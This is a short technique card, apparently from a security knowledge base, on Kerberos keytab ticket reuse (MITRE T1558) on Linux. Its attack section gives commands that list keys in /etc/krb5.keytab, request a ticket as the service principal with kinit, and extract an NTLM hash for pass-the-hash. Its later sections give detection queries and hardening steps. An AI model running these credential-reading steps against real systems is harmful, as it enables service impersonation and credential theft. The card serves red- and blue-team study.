# [CA-KERB-017]: Keytab CCACHE Ticket Reuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-017 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux / Unix |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Keytab files (`*.keytab`) contain unencrypted keys (hashes) for Kerberos principals, typically used by services (HTTP, MSSQL) to run without user interaction. An attacker with read access to a keytab can authenticate as that principal indefinitely.
- **Attack Surface:** `/etc/krb5.keytab` or custom paths.
- **Business Impact:** **Service Impersonation**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Read access to the keytab file (often Root or the service owner).
- **Tools:**
    - `klist`
    - `kinit`
    - [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration**
List keys in the keytab.
```bash
klist -k /etc/krb5.keytab
```

**Step 2: Authentication (TGT Request)**
Use the keytab to request a TGT.
```bash
# -k: Use keytab
# -t: Path to keytab
# principal: One of the names found in Step 1
kinit -k -t /etc/krb5.keytab host/server.domain.com
```

**Step 3: Hash Extraction (Optional)**
Extract the NTLM hash (RC4 key) for use in Windows (Pass-the-Hash).
```bash
python3 keytabextract.py krb5.keytab
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Auditd
| Source | Event ID | Filter Logic |
|---|---|---|
| **Auditd** | `open` | Access to `/etc/krb5.keytab` by unauthorized users. |

#### 5.2 Sentinel (KQL)
```kusto
Syslog
| where SyslogMessage has "kinit" and SyslogMessage has "keytab"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Permissions:** Ensure keytabs are `600` (Read/Write only by owner) and owned by `root` or the specific service user.
*   **Rotation:** Rotate keys regularly (using `ktutil` or `adcli`).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-004]
> **Next Logical Step:** [LAT-AD-001]
